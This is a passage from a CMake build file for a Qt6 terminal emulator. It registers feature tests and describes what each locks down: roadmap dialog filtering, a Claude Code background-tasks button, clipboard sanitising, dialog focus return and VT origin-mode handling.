        tests/features/review_changes_scroll_preserve/test_review_changes_scroll_preserve.cpp
    )
    target_compile_options(test_review_changes_scroll_preserve PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_review_changes_scroll_preserve PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME review_changes_scroll_preserve
        COMMAND test_review_changes_scroll_preserve)
    set_tests_properties(review_changes_scroll_preserve PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_bg_tasks_button — 0.7.38 feature. Background-tasks
    # status-bar button + live-tail dialog for Claude Code's
    # `run_in_background:true` Bash/Task launches. User request
    # 2026-04-25. Locks the parser shape (run_in_background +
    # backgroundTaskId), the tracker's QFileSystemWatcher + signal,
    # the button's hide-when-empty contract, the wire-up to the
    # showBgTasksDialog click handler, and the dialog's reuse of the
    # 0.7.37 scroll-preservation pattern. See spec.md.
    add_executable(test_claude_bg_tasks_button
        tests/features/claude_bg_tasks_button/test_claude_bg_tasks_button.cpp
    )
    target_compile_options(test_claude_bg_tasks_button PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_bg_tasks_button PRIVATE
        SRC_BGTASKS_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.cpp"
        SRC_BGTASKS_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasks.h"
        SRC_BGDIALOG_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.cpp"
        SRC_BGDIALOG_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudebgtasksdialog.h"
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_CMAKELISTS_PATH="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
        SRC_CLAUDE_INTEGRATION_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.cpp"
        SRC_CLAUDE_INTEGRATION_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/claudeintegration.h"
    )
    add_test(NAME claude_bg_tasks_button
        COMMAND test_claude_bg_tasks_button)
    set_tests_properties(claude_bg_tasks_button PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # github_status_bar — 0.7.45 feature. Two QLabel widgets on the
    # status bar surfacing GitHub-derived context: a Public/Private
    # repo-visibility badge and an "↗ Update vX.Y.Z available" link.
    # Source-grep harness — same shape as claude_bg_tasks_button.
    add_executable(test_github_status_bar
        tests/features/github_status_bar/test_github_status_bar.cpp
    )
    target_link_libraries(test_github_status_bar PRIVATE Qt6::Core)
    target_compile_definitions(test_github_status_bar PRIVATE
        SRC_MAINWINDOW_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        SRC_MAINWINDOW_H_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_RELEASE_WORKFLOW_PATH="${CMAKE_CURRENT_SOURCE_DIR}/.github/workflows/release.yml"
    )
    add_test(NAME github_status_bar
        COMMAND test_github_status_bar)
    set_tests_properties(github_status_bar PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # claude_state_dot_palette — 0.7.39 feature. User request
    # 2026-04-27: a single round dot per tab in a state-specific
    # colour, with grey for Idle, and the same palette extended to
    # the bottom status-bar Claude label. Locks the unified helper,
    # the eight-state palette, the uniform dot geometry (no outline,
    # no per-state radius), the helper-driven status-bar applier, and
    # the Auditing plumbing through ClaudeTabTracker::ShellState. See
    # tests/features/claude_state_dot_palette/spec.md.
    add_executable(test_claude_state_dot_palette
        tests/features/claude_state_dot_palette/test_claude_state_dot_palette.cpp
    )
    target_compile_options(test_claude_state_dot_palette PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_claude_state_dot_palette PRIVATE
        COLOREDTABBAR_H="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.h"
        COLOREDTABBAR_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/coloredtabbar.cpp"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        CLAUDETABTRACKER_H="${CMAKE_CURRENT_SOURCE_DIR}/src/claudetabtracker.h"
    )
    add_test(NAME claude_state_dot_palette
        COMMAND test_claude_state_dot_palette)
    set_tests_properties(claude_state_dot_palette PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer — 0.7.39 feature. User request 2026-04-27:
    # status-bar Roadmap button visible iff the active tab's cwd
    # contains a ROADMAP.md (case-insensitive); click opens a
    # filterable dialog with five peer category checkboxes (Done /
    # Planned / In progress / Considered / Currently being tackled).
    # Current-work bullets get a yellow left-border highlight derived
    # from CHANGELOG [Unreleased] + recent git commit subjects. The
    # test is a hybrid source-grep + behavioral harness — links the
    # roadmapdialog.cpp source so the static renderHtml helper can be
    # called against synthetic markdown to verify filter semantics
    # and the highlight CSS marker. See spec.md.
    add_executable(test_roadmap_viewer
        tests/features/roadmap_viewer/test_roadmap_viewer.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer PRIVATE src)
    target_compile_options(test_roadmap_viewer PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
        MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME roadmap_viewer COMMAND test_roadmap_viewer)
    set_tests_properties(roadmap_viewer PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer_tabs — ANTS-1100 (0.7.59). Faceted preset tabs +
    # search predicate (with `id:NNNN` shorthand) + larger default
    # size + persisted geometry on RoadmapDialog. 12 invariants across
    # filterFor / sortFor / presetMatching round-trips, descending-
    # chronological section reorder, search filter, and source-greps
    # for the tab strip + persistence wiring. Behavioural assertions
    # link the renderer source so synthetic markdown can be driven
    # through `RoadmapDialog::renderHtml(..., SortOrder, predicate)`
    # without spinning a real dialog. See spec.md.
    add_executable(test_roadmap_viewer_tabs
        tests/features/roadmap_viewer_tabs/test_roadmap_viewer_tabs.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer_tabs PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer_tabs PRIVATE src)
    target_compile_options(test_roadmap_viewer_tabs PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer_tabs PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
    )
    add_test(NAME roadmap_viewer_tabs COMMAND test_roadmap_viewer_tabs)
    set_tests_properties(roadmap_viewer_tabs PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_viewer_archive — ANTS-1125 (0.7.61). Per-version
    # archive load path: archiveDirFor() canonical-resolves the
    # archive dir; loadMarkdown() concatenates `<MAJOR>.<MINOR>.md`
    # archives in numeric descending order with thematic-break +
    # HTML-comment sentinel separators; shouldLoadHistory() gates
    # the load on Preset::History or non-empty search. 13 INVs span
    # the static helpers (driven on real temp-dir layouts) and
    # source-greps for the watcher hookup, the IPC-scope guard-rail,
    # and the format-standard amendment. See spec.md.
    add_executable(test_roadmap_viewer_archive
        tests/features/roadmap_viewer_archive/test_roadmap_viewer_archive.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_viewer_archive PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_viewer_archive PRIVATE src)
    target_compile_options(test_roadmap_viewer_archive PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_viewer_archive PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
        ROADMAP_FORMAT_MD="${CMAKE_CURRENT_SOURCE_DIR}/docs/standards/roadmap-format.md"
        SRC_DIR="${CMAKE_CURRENT_SOURCE_DIR}/src"
        ROTATE_ROADMAP_SH="${CMAKE_CURRENT_SOURCE_DIR}/packaging/rotate-roadmap.sh"
    )
    add_test(NAME roadmap_viewer_archive COMMAND test_roadmap_viewer_archive)
    set_tests_properties(roadmap_viewer_archive PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # kwin_position_tracker — ANTS-1045. KWinPositionTracker rename
    # + KDE_FULL_SESSION / XDG_CURRENT_DESKTOP env-gate +
    # QScopeGuard temp-file cleanup. Source-grep INVs (rename
    # completeness, guard placement, scope-guard ordering, TOCTOU
    # preservation, no hardcoded /tmp path regression) plus
    # behavioural drives of the env-gate bail (INV-4b: unsetenv +
    # temp-dir snapshot) and the failure-path cleanup (INV-5c:
    # PATH=empty + bounded event-loop spin). See spec.md.
    add_executable(test_kwin_position_tracker
        tests/features/kwin_position_tracker/test_kwin_position_tracker.cpp
        src/kwinpositiontracker.cpp
    )
    target_link_libraries(test_kwin_position_tracker PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_kwin_position_tracker PRIVATE src)
    target_compile_options(test_kwin_position_tracker PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_kwin_position_tracker PRIVATE
        KWINPOS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/kwinpositiontracker.h"
        KWINPOS_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/kwinpositiontracker.cpp"
        MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        CMAKELISTS_TXT="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
        SRC_DIR="${CMAKE_CURRENT_SOURCE_DIR}/src"
    )
    add_test(NAME kwin_position_tracker
             COMMAND test_kwin_position_tracker -platform offscreen)
    set_tests_properties(kwin_position_tracker PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # dialog_close_focus_return — ANTS-1050. Auto-return focus to the
    # active terminal when any dialog closes. Drives the pure-logic
    # helper dialogfocus::shouldRefocusOnDialogClose against synthetic
    # QDialog/QWidget instances + source-greps mainwindow.{h,cpp} for
    # the qApp filter installation, the eventFilter Close-event
    # branch, the deferred-dispatch primitive (singleShot or
    # invokeMethod), the focusedTerminal() resolution, and the
    # null-guard. See spec.md.
    add_executable(test_dialog_close_focus_return
        tests/features/dialog_close_focus_return/test_dialog_close_focus_return.cpp
    )
    target_link_libraries(test_dialog_close_focus_return PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_dialog_close_focus_return PRIVATE src)
    target_compile_options(test_dialog_close_focus_return PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_dialog_close_focus_return PRIVATE
        MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
        DIALOGFOCUS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/dialogfocus.h"
    )
    add_test(NAME dialog_close_focus_return
             COMMAND test_dialog_close_focus_return -platform offscreen)
    set_tests_properties(dialog_close_focus_return PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # dialog_pseudo_modal — ANTS-1051. Pseudo-modal blocking via
    # the qApp eventFilter — mouse/key/wheel events landing outside
    # any visible QDialog get swallowed. Drives the pure-logic
    # helper dialogfocus::shouldSuppressEventForDialog over all
    # six suppressed event types + non-suppressed types + stacked
    # dialogs + the dialog-itself edge case + defensive nulls.
    # Source-greps mainwindow.cpp for the eventFilter wiring and
    # the shared-with-1050 contract. See spec.md.
    add_executable(test_dialog_pseudo_modal
        tests/features/dialog_pseudo_modal/test_dialog_pseudo_modal.cpp
    )
    target_link_libraries(test_dialog_pseudo_modal PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_dialog_pseudo_modal PRIVATE src)
    target_compile_options(test_dialog_pseudo_modal PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_dialog_pseudo_modal PRIVATE
        DIALOGFOCUS_H="${CMAKE_CURRENT_SOURCE_DIR}/src/dialogfocus.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME dialog_pseudo_modal
             COMMAND test_dialog_pseudo_modal -platform offscreen)
    set_tests_properties(dialog_pseudo_modal PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # scroll_snapshot_intent — ANTS-1118 (0.7.65). Locks the
    # ANTS-1118 fix: smooth-scroll snapshot is captured on user
    # scroll intent (wheelEvent: m_smoothScrollTarget > 0 from
    # offset 0 with no existing snapshot), not on committed
    # offset transition. Source-grep on terminalwidget.cpp.
    # See spec.md for the root-cause analysis (indie-review L2
    # fold-in 2026-05-01).
    add_executable(test_scroll_snapshot_intent
        tests/features/scroll_snapshot_intent/test_scroll_snapshot_intent.cpp
    )
    target_link_libraries(test_scroll_snapshot_intent PRIVATE
        Qt6::Core
    )
    target_include_directories(test_scroll_snapshot_intent PRIVATE src)
    target_compile_options(test_scroll_snapshot_intent PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_scroll_snapshot_intent PRIVATE
        TERMINALWIDGET_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME scroll_snapshot_intent
             COMMAND test_scroll_snapshot_intent)
    set_tests_properties(scroll_snapshot_intent PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # roadmap_kind_facets — ANTS-1106 (0.7.64). Locks the
    # Kind-faceted secondary filter in RoadmapDialog. Drives
    # RoadmapDialog::renderHtml across four filter shapes (empty
    # / single Kind / multi Kind / missing-Kind bullet under
    # non-empty filter) and source-greps the dialog setup for
    # the Kind row's QLabel + per-Kind checkbox objectNames.
    add_executable(test_roadmap_kind_facets
        tests/features/roadmap_kind_facets/test_roadmap_kind_facets.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_roadmap_kind_facets PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_roadmap_kind_facets PRIVATE src)
    target_compile_options(test_roadmap_kind_facets PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_roadmap_kind_facets PRIVATE
        ROADMAPDIALOG_H="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.h"
        ROADMAPDIALOG_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/roadmapdialog.cpp"
    )
    add_test(NAME roadmap_kind_facets
             COMMAND test_roadmap_kind_facets -platform offscreen)
    set_tests_properties(roadmap_kind_facets PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # clipboard_redaction — ANTS-1014 (0.7.63). Locks the
    # clipboard-write redaction funnel (clipboardguard::sanitize +
    # clipboardguard::writeText). Drives the pure sanitize over
    # the three Source shapes (Trusted, UntrustedPty,
    # UntrustedPlugin) for NUL-strip + 1 MiB cap behaviour, plus
    # source-greps terminalwidget.cpp + mainwindow.cpp for the
    # absence of raw QApplication::clipboard()->setText( and the
    # presence of the two untrusted-source classifications. See
    # spec.md.
    add_executable(test_clipboard_redaction
        tests/features/clipboard_redaction/test_clipboard_redaction.cpp
    )
    # Qt6::Gui is needed because clipboardguard.h's writeText signature
    # uses QClipboard::Mode as a default arg. The test only drives the
    # pure sanitize free function — but the header still needs the
    # type to parse.
    target_link_libraries(test_clipboard_redaction PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_clipboard_redaction PRIVATE src)
    target_compile_options(test_clipboard_redaction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_clipboard_redaction PRIVATE
        CLIPBOARDGUARD_H="${CMAKE_CURRENT_SOURCE_DIR}/src/clipboardguard.h"
        TERMINALWIDGET_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME clipboard_redaction
             COMMAND test_clipboard_redaction)
    set_tests_properties(clipboard_redaction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # update_available_menubar — ANTS-1124 (0.7.62). Locks the
    # migration of the update-available indicator from a status-bar
    # QLabel to a top-level menu-bar QAction (sits to the right of
    # &Help). Source-grep only — the change is a wiring swap, no
    # new behavioural surface to drive. See spec.md.
    add_executable(test_update_available_menubar
        tests/features/update_available_menubar/test_update_available_menubar.cpp
    )
    target_link_libraries(test_update_available_menubar PRIVATE
        Qt6::Core
    )
    target_include_directories(test_update_available_menubar PRIVATE src)
    target_compile_options(test_update_available_menubar PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_update_available_menubar PRIVATE
        MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME update_available_menubar
             COMMAND test_update_available_menubar)
    set_tests_properties(update_available_menubar PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # status_bar_branch_chip — ANTS-1109 (0.7.62). Locks the
    # branch-derived colour cue on the git-branch chip
    # (green/main-master-trunk vs amber/feature) and the
    # pure-helper branchchip::isPrimaryBranch. Drives the helper
    # over six branch-name inputs + source-greps mainwindow.cpp
    # for the consultation site and palette-index wiring. See
    # spec.md.
    add_executable(test_status_bar_branch_chip
        tests/features/status_bar_branch_chip/test_status_bar_branch_chip.cpp
    )
    target_link_libraries(test_status_bar_branch_chip PRIVATE
        Qt6::Core
    )
    target_include_directories(test_status_bar_branch_chip PRIVATE src)
    target_compile_options(test_status_bar_branch_chip PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_status_bar_branch_chip PRIVATE
        MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME status_bar_branch_chip
             COMMAND test_status_bar_branch_chip)
    set_tests_properties(status_bar_branch_chip PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_roadmap_query — ANTS-1117 v1 (0.7.59). New IPC
    # verb that surfaces the parsed ROADMAP.md as structured JSON
    # to a Claude Code session over the existing remote-control
    # transport. Behavioural test drives RoadmapDialog::parseBullets
    # against synthetic markdown, plus source-grep INVs for the verb
    # registration + cache fields. See spec.md.
    add_executable(test_remote_control_roadmap_query
        tests/features/remote_control_roadmap_query/test_remote_control_roadmap_query.cpp
        src/roadmapdialog.cpp
        src/coloredtabbar.cpp
        src/themes.cpp
        src/config.cpp
        src/debuglog.cpp
    )
    target_link_libraries(test_remote_control_roadmap_query PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_remote_control_roadmap_query PRIVATE src)
    target_compile_options(test_remote_control_roadmap_query PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_roadmap_query PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
    )
    add_test(NAME remote_control_roadmap_query
        COMMAND test_remote_control_roadmap_query)
    set_tests_properties(remote_control_roadmap_query PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # remote_control_tab_list — ANTS-1117 v1 (0.7.59). Source-grep
    # harness for the new `tab-list` IPC verb: verifies dispatch
    # registration, cmdTabList + tabsAsJson wiring, the six expected
    # per-tab keys, and the ClaudeTabTracker integration for
    # claude_running. See spec.md.
    add_executable(test_remote_control_tab_list
        tests/features/remote_control_tab_list/test_remote_control_tab_list.cpp
    )
    target_compile_options(test_remote_control_tab_list PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_remote_control_tab_list PRIVATE
        SRC_RC_HEADER="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.h"
        SRC_RC_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/remotecontrol.cpp"
        SRC_MAINWINDOW_H="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.h"
        SRC_MAINWINDOW_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/mainwindow.cpp"
    )
    add_test(NAME remote_control_tab_list
        COMMAND test_remote_control_tab_list)
    set_tests_properties(remote_control_tab_list PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # audit_engine_extraction — ANTS-1119 v1 (0.7.59). Locks the
    # extraction of pure-data types + applyFilter / parseFindings /
    # capFindings into a Qt6::Core-only `auditengine.{h,cpp}` module.
    # Behavioural INVs drive `AuditEngine::capFindings` and
    # `AuditEngine::parseFindings` directly; structural INVs grep
    # both files for the GUI-include exclusion + the dialog
    # forwarding pattern. See spec.md.
    add_executable(test_audit_engine_extraction
        tests/features/audit_engine_extraction/test_audit_engine_extraction.cpp
        src/auditengine.cpp
    )
    target_link_libraries(test_audit_engine_extraction PRIVATE
        Qt6::Core
    )
    target_include_directories(test_audit_engine_extraction PRIVATE src)
    target_compile_options(test_audit_engine_extraction PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_audit_engine_extraction PRIVATE
        SRC_AUDIT_ENGINE_H="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.h"
        SRC_AUDIT_ENGINE_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/auditengine.cpp"
        SRC_AUDIT_H="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.h"
        SRC_AUDIT_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/auditdialog.cpp"
    )
    add_test(NAME audit_engine_extraction
        COMMAND test_audit_engine_extraction)
    set_tests_properties(audit_engine_extraction PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # local_subagent_framework — ANTS-1116 v1 (0.7.59). Behavioural
    # test of `AntsHelper::driftCheck` against synthetic tree
    # fixtures (clean / drift / missing-script / bogus-root) plus a
    # source-grep INV that the CMake `ANTS_ENABLE_HELPER_CLI` option
    # gates the new `ants-helper` binary. See spec.md.
    add_executable(test_local_subagent_framework
        tests/features/local_subagent_framework/test_local_subagent_framework.cpp
        src/antshelper.cpp
    )
    target_link_libraries(test_local_subagent_framework PRIVATE
        Qt6::Core
    )
    target_include_directories(test_local_subagent_framework PRIVATE src)
    target_compile_options(test_local_subagent_framework PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_local_subagent_framework PRIVATE
        SRC_CMAKELISTS="${CMAKE_CURRENT_SOURCE_DIR}/CMakeLists.txt"
    )
    add_test(NAME local_subagent_framework
        COMMAND test_local_subagent_framework)
    set_tests_properties(local_subagent_framework PROPERTIES
        LABELS "features;fast"
        TIMEOUT 15)

    # vtbatch_zero_copy — 0.7.40 perf bundle. Locks the shape of the
    # worker→GUI batch signal so a refactor can't silently revert
    # back to the deep-copy `const VtBatch &` form. Behavioural
    # equivalence (the action stream identity across the thread hop)
    # is covered by threaded_parse_equivalence; this test only
    # source-greps the cross-thread signal carrier shape, the alias,
    # the make_shared emit sites, and the pointer-deref receiver.
    add_executable(test_vtbatch_zero_copy
        tests/features/vtbatch_zero_copy/test_vtbatch_zero_copy.cpp
    )
    target_compile_options(test_vtbatch_zero_copy PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_vtbatch_zero_copy PRIVATE
        VTSTREAM_H="${CMAKE_CURRENT_SOURCE_DIR}/src/vtstream.h"
        VTSTREAM_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/vtstream.cpp"
        TERMINALWIDGET_H="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.h"
        TERMINALWIDGET_CPP="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalwidget.cpp"
    )
    add_test(NAME vtbatch_zero_copy COMMAND test_vtbatch_zero_copy)
    set_tests_properties(vtbatch_zero_copy PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # a11y_chrome_names — 0.7.41 a11y bundle. ROADMAP § "Accessibility
    # pass on chrome" (L1914) + § "AT-SPI introspection lane" (L1918).
    # Verifies that every glyph-only chrome control (TitleBar's four
    # window buttons + the CommandPalette's search input/result list)
    # carries an explicit setAccessibleName / setAccessibleDescription,
    # and acts as the introspection lane: walks the chrome widget tree
    # and asserts every QAbstractButton + QLineEdit reachable has a
    # non-empty accessibleName() OR a non-empty text(). A future
    # contributor adding a glyph-only chrome button without a name
    # breaks this test. Links titlebar.cpp + commandpalette.cpp source
    # so we can drive their constructors directly under the offscreen
    # Qt platform — no MainWindow link needed. See spec.md.
    add_executable(test_a11y_chrome_names
        tests/features/a11y_chrome_names/test_a11y_chrome_names.cpp
        src/titlebar.cpp
        src/commandpalette.cpp
    )
    target_link_libraries(test_a11y_chrome_names PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
    )
    target_include_directories(test_a11y_chrome_names PRIVATE src)
    target_compile_options(test_a11y_chrome_names PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_a11y_chrome_names PRIVATE
        TITLEBAR_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/titlebar.cpp"
        COMMANDPALETTE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/commandpalette.cpp"
    )
    set_target_properties(test_a11y_chrome_names PROPERTIES AUTOMOC ON)
    add_test(NAME a11y_chrome_names COMMAND test_a11y_chrome_names)
    set_tests_properties(a11y_chrome_names PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # command_palette_ghost_completion — 0.7.42. ROADMAP § "Command
    # Palette ghost-completion (near-term, small scope)" (L2160). Pins
    # the GhostLineEdit subclass + Tab-commit contract: empty/no-match/
    # contains-only-match → empty ghost; case-insensitive prefix match
    # → suffix preserves action-name casing; Tab commits ghost into
    # input text and clears the ghost in the same dispatch cycle.
    # Drives CommandPalette directly under the offscreen platform.
    add_executable(test_command_palette_ghost_completion
        tests/features/command_palette_ghost_completion/test_command_palette_ghost_completion.cpp
        src/commandpalette.cpp
    )
    target_link_libraries(test_command_palette_ghost_completion PRIVATE
        Qt6::Core
        Qt6::Gui
        Qt6::Widgets
        Qt6::Test
    )
    target_include_directories(test_command_palette_ghost_completion PRIVATE src)
    target_compile_options(test_command_palette_ghost_completion PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_command_palette_ghost_completion PRIVATE
        COMMANDPALETTE_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/commandpalette.cpp"
    )
    set_target_properties(test_command_palette_ghost_completion PROPERTIES AUTOMOC ON)
    add_test(NAME command_palette_ghost_completion COMMAND test_command_palette_ghost_completion)
    set_tests_properties(command_palette_ghost_completion PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10
        ENVIRONMENT "QT_QPA_PLATFORM=offscreen")

    # origin_mode_correctness — 0.7.34 fix. Locks DECOM (origin mode)
    # CUP/HVP/VPA row translation, DECSTBM origin-aware home, and
    # DECSC saving DECOM + DECAWM (with DECRC restoring them). Prior
    # to 0.7.34 every CUP under origin mode jumped to absolute rows
    # and DECSC silently lost the flags — tmux/screen save-restore
    # round-trips broke. See spec.md.
    add_executable(test_origin_mode
        tests/features/origin_mode_correctness/test_origin_mode.cpp
        src/terminalgrid.cpp
        src/vtparser.cpp
    )
    target_link_libraries(test_origin_mode PRIVATE
        Qt6::Core
        Qt6::Gui
    )
    target_include_directories(test_origin_mode PRIVATE src)
    target_compile_options(test_origin_mode PRIVATE
        -Wall -Wextra -Wpedantic
    )
    target_compile_definitions(test_origin_mode PRIVATE
        SRC_TERMINALGRID_CPP_PATH="${CMAKE_CURRENT_SOURCE_DIR}/src/terminalgrid.cpp"
    )
    add_test(NAME origin_mode_correctness COMMAND test_origin_mode)
    set_tests_properties(origin_mode_correctness PROPERTIES
        LABELS "features;fast"
        TIMEOUT 10)

    # settings_parse_failure_mirror — 0.7.31 test-coverage fill-in.
    # Mirrors the existing config_parse_failure_guard test for the
    # other two parse-failure refuse sites: ClaudeAllowlist::saveSettings
    # and SettingsDialog's two Claude-hook installers. See
    # tests/features/settings_parse_failure_mirror/spec.md.
